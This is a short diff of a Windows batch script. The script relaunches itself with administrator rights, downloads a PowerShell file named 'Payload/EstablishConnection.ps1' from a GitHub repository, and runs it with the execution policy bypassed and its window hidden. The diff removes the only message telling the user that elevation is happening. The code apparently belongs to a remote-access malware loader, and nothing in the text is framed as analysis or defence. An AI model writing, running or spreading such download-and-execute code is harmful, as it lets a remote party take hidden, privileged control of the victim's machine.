@@ -15,7 +15,6 @@ if "%1"=="RunAs_Admin" (
     powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
     PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File ".\EstablishConnection.ps1"
 ) else (
-    echo Running script as administrator...
     powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
 )
 
